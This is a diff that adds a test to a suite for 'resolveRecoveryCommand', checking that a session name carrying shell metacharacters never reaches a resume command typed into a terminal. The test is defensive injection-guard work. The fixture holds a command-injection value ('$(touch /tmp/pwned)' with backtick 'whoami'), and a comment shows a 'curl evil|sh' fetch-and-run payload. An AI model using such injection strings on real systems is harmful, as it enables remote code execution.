@@ -110,6 +110,24 @@ describe('resolveRecoveryCommand', () => {
     );
   });
 
+  it('does NOT append --resume when the name carries shell metacharacters (RCE guard)', () => {
+    // The command is typed into the pane shell, so a name like `x$(curl evil|sh)`
+    // would execute on recovery if it reached the line. The allowlist rejects it
+    // and recovery falls through to a plain relaunch (no by-name resume).
+    createTerminalRecord({
+      sessionId: 't_inj',
+      name: 'x$(touch /tmp/pwned)`whoami`',
+      agentKind: 'claude_code',
+      bootCommand: 'claude --remote-control'
+    });
+    const rec = getTerminalRecord('t_inj')!;
+    const out = resolveRecoveryCommand(rec, { resume: true });
+    expect(out).toBe('claude --remote-control');
+    expect(out).not.toContain('--resume');
+    expect(out).not.toContain('$(');
+    expect(out).not.toContain('`');
+  });
+
   it('does not double-append --resume when already present', () => {
     createTerminalRecord({ sessionId: 't5', name: 'x', agentKind: 'claude_code', bootCommand: 'claude --resume "x"' });
     const rec = getTerminalRecord('t5')!;
